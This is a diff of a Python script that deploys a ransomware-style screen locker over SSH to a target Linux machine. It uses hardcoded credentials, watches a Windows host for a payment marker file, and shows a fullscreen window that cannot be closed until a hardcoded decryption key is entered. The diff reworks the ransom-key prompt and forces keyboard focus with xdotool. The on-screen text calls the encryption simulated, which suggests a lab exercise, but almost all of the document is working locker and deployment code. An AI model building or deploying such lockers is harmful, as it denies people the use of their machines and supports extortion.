@@ -10,7 +10,6 @@ TARGET_WIN = "172.16.1.102"
 USERNAME = "CEO"
 PASSWORD = "CEOPass123!"
 
-# We need a global reference to the SSH connection so our thread can use it
 ssh_kali = None
 
 def check_for_payment():
@@ -18,7 +17,6 @@ def check_for_payment():
     global ssh_kali
     print("[*] Started payment monitor thread.")
     
-    # Connect to Windows specifically for checking the file via SSH
     try:
         win_ssh = paramiko.SSHClient()
         win_ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -28,7 +26,7 @@ def check_for_payment():
         return
 
     while True:
-        time.sleep(3) # Check every 3 seconds
+        time.sleep(3)
         try:
             stdin, stdout, stderr = win_ssh.exec_command('if exist C:\\Windows\\Temp\\PAID.txt (echo FOUND)')
             result = stdout.read().decode().strip()
@@ -46,13 +44,11 @@ def check_for_payment():
 def main():
     global ssh_kali
     
-    # Start the background monitor thread
     monitor = threading.Thread(target=check_for_payment, daemon=True)
     monitor.start()
 
     print(f"[*] Preparing to deploy payload to hardened target {TARGET_KALI}...")
 
-    # The Tkinter Payload
     payload_script = """#!/usr/bin/env python3
 import tkinter as tk
 import time
@@ -70,53 +66,65 @@ def force_fullscreen():
     except Exception:
         pass
 
-def show_prompt_screen():
-    lock_frame.pack_forget()
-    prompt_frame.pack(expand=True, fill='both')
+def create_prompt_window():
+    # Create a REAL window for the prompt so it can accept keyboard input
+    prompt_win = tk.Toplevel(root)
+    prompt_win.title("Payment Required")
+    prompt_win.geometry("500x250")
+    prompt_win.configure(bg="black")
+    prompt_win.attributes('-topmost', True) # Keep it above the lock screen
+    prompt_win.resizable(False, False)
     
-    # Force focus after a tiny delay to ensure the frame has been drawn
-    def delayed_focus():
-        time.sleep(0.1)
-        root.focus_force()
-        entry.focus_set()
-        try:
-            # Find the window, activate it, and left-click in the middle of the screen
-            # This guarantees the X11 server hands over keyboard control
-            subprocess.run(["xdotool", "search", "--name", "System Locked", "windowactivate"], check=False)
-            subprocess.run(["xdotool", "mousemove", "0", "0", "click", "1"], check=False)
-        except Exception:
-            pass
+    # Center it
+    screen_width = root.winfo_screenwidth()
+    screen_height = root.winfo_screenheight()
+    x = (screen_width // 2) - 250
+    y = (screen_height // 2) - 125
+    prompt_win.geometry(f"500x250+{x}+{y}")
+
+    tk.Label(prompt_win, text="Enter the decryption key\nto unlock your files:", 
+             fg="lime", bg="black", font=("Courier", 16, "bold")).pack(pady=20)
+             
+    entry = tk.Entry(prompt_win, show="*", font=("Courier", 20), width=20)
+    entry.pack(pady=10)
+    
+    def check_password(event=None):
+        global is_decrypting
+        if is_decrypting:
+            return
             
-    threading.Thread(target=delayed_focus, daemon=True).start()
-
-def check_password():
-    global is_decrypting
-    if is_decrypting:
-        return
-
-    if entry.get() == "Ransomware2026!":
-        is_decrypting = True
-        submit_btn.config(state="disabled")
-        entry.unbind('<Return>')
-        
-        prompt_frame.pack_forget()
-        lbl.config(text="Decrypting...")
-        lock_frame.pack(expand=True, fill='both')
-        root.update()
-        
-        for i in range(0, 101, 10):
-            lbl.config(text=f"Decrypting your files... {i}%")
+        if entry.get() == "Ransomware2026!":
+            is_decrypting = True
+            prompt_win.destroy()
+            
+            lbl.config(text="Decrypting...")
             root.update()
-            time.sleep(0.2)
-        root.destroy()
-    else:
-        # On incorrect password, flash red and clear the entry
-        entry.delete(0, tk.END)
-        prompt_frame.configure(bg="darkred")
-        prompt_frame.update()
-        time.sleep(0.3)
-        prompt_frame.configure(bg="black")
-        entry.focus_set()
+            for i in range(0, 101, 10):
+                lbl.config(text=f"Decrypting your files... {i}%")
+                root.update()
+                time.sleep(0.2)
+            root.destroy()
+        else:
+            entry.delete(0, tk.END)
+            prompt_win.configure(bg="darkred")
+            prompt_win.update()
+            time.sleep(0.3)
+            prompt_win.configure(bg="black")
+
+    tk.Button(prompt_win, text="Decrypt", command=check_password, 
+              bg="darkred", fg="white", font=("Courier", 16, "bold")).pack(pady=10)
+              
+    entry.bind('<Return>', check_password)
+    
+    # Force keyboard focus to the new window
+    prompt_win.focus_force()
+    entry.focus_set()
+    
+    # Use xdotool to force the OS to activate this specific new window
+    try:
+        subprocess.run(["xdotool", "search", "--name", "Payment Required", "windowactivate"], check=False)
+    except Exception:
+        pass
 
 root = tk.Tk()
 root.title("System Locked")
@@ -127,32 +135,13 @@ screen_height = root.winfo_screenheight()
 root.geometry(f"{screen_width}x{screen_height}+0+0")
 root.attributes('-topmost', True) 
 
-# --- FRAME 1: The Lock Screen ---
-lock_frame = tk.Frame(root, bg="black")
-lock_frame.pack(expand=True, fill='both')
-
-lbl = tk.Label(lock_frame, text="Your Kali files have been simulated-encrypted!\\n\\nYou must pay the ransom on the Windows Device to unlock.", 
+lbl = tk.Label(root, text="Your Kali files have been simulated-encrypted!\\n\\nYou must pay the ransom on the Windows Device to unlock.", 
                fg="lime", bg="black", font=("Courier", 26, "bold"))
 lbl.pack(expand=True, fill='both')
 
-btn = tk.Button(lock_frame, text="Pay Ransom", command=show_prompt_screen, 
+btn = tk.Button(root, text="Pay Ransom", command=create_prompt_window, 
                 bg="darkred", fg="white", font=("Courier", 20, "bold"))
 btn.pack(side="bottom", pady=50)
-
-# --- FRAME 2: The Prompt Screen ---
-prompt_frame = tk.Frame(root, bg="black")
-prompt_lbl = tk.Label(prompt_frame, text="Enter the decryption key to unlock your files:", 
-                      fg="lime", bg="black", font=("Courier", 24, "bold"))
-prompt_lbl.pack(expand=True, fill='both')
-
-entry = tk.Entry(prompt_frame, show="*", font=("Courier", 20), width=20)
-entry.pack(pady=20)
-
-submit_btn = tk.Button(prompt_frame, text="Decrypt", command=check_password, 
-                       bg="darkred", fg="white", font=("Courier", 20, "bold"))
-submit_btn.pack(pady=20)
-
-entry.bind('<Return>', lambda event: check_password())
 
 root.protocol("WM_DELETE_WINDOW", lambda: None)
 threading.Thread(target=force_fullscreen, daemon=True).start()
